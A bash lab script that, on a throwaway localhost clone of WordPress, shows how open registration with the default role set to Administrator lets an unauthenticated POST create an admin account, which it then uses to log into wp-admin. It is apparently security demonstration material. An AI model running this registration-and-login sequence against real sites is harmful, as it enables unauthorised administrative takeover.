#!/usr/bin/env bash
# Demonstrate unauthenticated user creation when "Anyone can register" is on,
# including the dangerous case where the default role is Administrator.
#
# Runs against a throwaway clone of the lab database on a separate port; the
# main lab instance and its settings are never modified.
set -euo pipefail

LAB_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PORT="${DEMO_PORT:-8910}"
CLONE="$(mktemp -d /tmp/wp-reg-demo.XXXXXX)"
PHP="$LAB_DIR/bin/php"
WPCLI="$LAB_DIR/bin/wp-cli.phar"
SERVER_PID=""

cleanup() {
  if [ -n "$SERVER_PID" ]; then
    kill "$SERVER_PID" 2>/dev/null || true
    wait "$SERVER_PID" 2>/dev/null || true
  fi
  rm -rf "$CLONE"
}
trap cleanup EXIT

[ -d "$LAB_DIR/wordpress/wp-includes" ] || {
  echo "missing $LAB_DIR/wordpress; run ./bin/setup-local.sh first" >&2
  exit 1
}

cp -a "$LAB_DIR/wordpress/." "$CLONE/"
sed -i \
  -e "s#http://127.0.0.1:8899#http://127.0.0.1:$PORT#g" \
  -e "s#$LAB_DIR/wp-debug.log#$CLONE/wp-debug.log#g" \
  "$CLONE/wp-config.php"

wp() { "$PHP" "$WPCLI" "$@" --path="$CLONE"; }

wp option update home "http://127.0.0.1:$PORT" >/dev/null
wp option update siteurl "http://127.0.0.1:$PORT" >/dev/null

PHP_CLI_SERVER_WORKERS=4 nohup "$PHP" -S "127.0.0.1:$PORT" -t "$CLONE" \
  > "$CLONE/server.log" 2>&1 &
SERVER_PID=$!

for _ in $(seq 1 30); do
  CODE="$(curl -s -o /dev/null -w '%{http_code}' "http://127.0.0.1:$PORT/" || true)"
  [ "$CODE" = "200" ] && break
  sleep 1
done
[ "${CODE:-}" = "200" ] || { echo "clone did not start on port $PORT" >&2; exit 1; }

role_of() { wp user get "$1" --field=roles 2>/dev/null || true; }

register() {
  curl -sS --max-time 20 -D "$CLONE/headers.txt" -o "$CLONE/body.html" \
    --data-urlencode "user_login=$1" \
    --data-urlencode "user_email=$1@example.com" \
    --data-urlencode 'wp-submit=Register' \
    "http://127.0.0.1:$PORT/wp-login.php?action=register"
  grep -i '^location' "$CLONE/headers.txt" | tr -d '\r' || true
}

TAG="$$"
BLOCKED_USER="demo_blocked_$TAG"
SUB_USER="demo_sub_$TAG"
ADMIN_USER="demo_admin_$TAG"

echo "== Unauthenticated user creation / default-role demo =="
echo "clone: $CLONE (port $PORT)"
echo
echo "-- control: registration disabled (WordPress default) --"
wp option update users_can_register 0 >/dev/null
register "$BLOCKED_USER"
if [ -z "$(role_of "$BLOCKED_USER")" ]; then
  echo "  [BLOCKED] user '$BLOCKED_USER' was not created"
else
  echo "  [UNEXPECTED] user '$BLOCKED_USER' exists with role $(role_of "$BLOCKED_USER")"
fi
echo

echo "-- misconfiguration 1: registration enabled, default role Subscriber --"
wp option update users_can_register 1 >/dev/null
wp option update default_role subscriber >/dev/null
register "$SUB_USER"
echo "  role of '$SUB_USER': $(role_of "$SUB_USER" || echo '<not created>')"
echo

echo "-- misconfiguration 2: registration enabled, default role Administrator --"
wp option update default_role administrator >/dev/null
register "$ADMIN_USER"
echo "  role of '$ADMIN_USER': $(role_of "$ADMIN_USER" || echo '<not created>')"

# Simulate the attacker receiving the registration email (the local mailer
# cannot send) and use the new account to log into wp-admin.
DEMO_PASS="$(python3 -c 'import secrets,string; print("".join(secrets.choice(string.ascii_letters+string.digits) for _ in range(20)))')"
printf '%s' "$DEMO_PASS" | LAB_LOGIN="$ADMIN_USER" "$PHP" "$WPCLI" --path="$CLONE" eval \
  '$p = trim( stream_get_contents( STDIN ) ); $u = get_user_by( "login", getenv( "LAB_LOGIN" ) ); wp_set_password( $p, $u->ID );' \
  >/dev/null

JAR="$CLONE/cookies.txt"
curl -sS --max-time 20 -c "$JAR" "http://127.0.0.1:$PORT/wp-login.php" -o /dev/null
curl -sS --max-time 20 -b "$JAR" -c "$JAR" -L -o "$CLONE/dashboard.html" \
  --data-urlencode "log=$ADMIN_USER" \
  --data-urlencode "pwd=$DEMO_PASS" \
  --data-urlencode 'wp-submit=Log In' \
  --data-urlencode 'testcookie=1' \
  "http://127.0.0.1:$PORT/wp-login.php"
if grep -q 'id="wpadminbar"' "$CLONE/dashboard.html"; then
  echo "  [EXPLOIT] logged into wp-admin as '$ADMIN_USER' (registration email simulated)"
else
  echo "  [UNEXPECTED] could not log in as the newly registered account"
fi
echo

if [ "$(role_of "$ADMIN_USER")" = "administrator" ]; then
  echo "== RESULT: unauthenticated request created an Administrator =="
else
  echo "== RESULT: expected administrator was not created =="
  exit 1
fi
